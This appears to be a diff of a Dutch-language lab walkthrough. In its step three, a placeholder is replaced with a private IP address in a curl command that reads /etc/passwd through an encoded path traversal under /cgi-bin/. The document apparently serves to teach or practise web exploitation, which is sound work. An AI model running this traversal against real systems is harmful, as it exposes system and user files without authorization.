@@ -23,7 +23,7 @@ Stap 3: Path Traversal aanval uitvoeren
 Gebruik de volgende curl command om de path traversal aanval uit te voeren:
 
 ```bash
-curl -v --path-as-is http://<ip>:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
+curl -v --path-as-is http://192.168.0.145:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
 ```
 
 Als je deze command uitvoert, zou je de inhoud van het bestand /etc/passwd moeten zien. Dit bestand bevat informatie over de gebruikers op het systeem.
